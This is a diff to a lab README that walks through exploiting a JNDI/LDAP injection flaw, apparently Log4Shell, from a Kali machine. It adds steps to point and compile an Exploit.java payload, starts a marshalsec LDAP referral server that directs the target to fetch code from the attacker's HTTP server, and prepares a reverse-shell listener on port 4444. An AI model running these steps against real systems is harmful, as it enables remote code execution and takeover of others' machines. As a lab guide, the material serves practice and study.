@@ -24,6 +24,16 @@ Prerequisites:
 - Ubuntu Server
 
 # Kali Linux
+## Prepping Java File
+Edit the .java file to enter your local Kali machines IP
+```
+cd attacker/exploit && sudo nano Exploit.java
+```
+Once you have updated your java file to point to your Kali machine's IP, You need to compile it
+```
+sudo javac -source 1.8 -target 1.8 Exploit.java
+```
+
 ## Running `LDAP Server` and `HTTP Server`
 ### `HTTP Server`
 **1**. Move to `exploit` folder and spin up the http server by means of Python.
@@ -44,7 +54,7 @@ mvn clean package -DskipTests
 ```
 java -cp ldap_server-1.0-all.jar marshalsec.jndi.LDAPRefServer "http://http_server_ip:http_server_port/#Exploit"
 ```
-### Listen for callback
+## Listen for callback
 In a seperate Terminal Tab/Window:
 **1.** Use the Listen back command on port 4444 to wait for a reverse shell
 ```
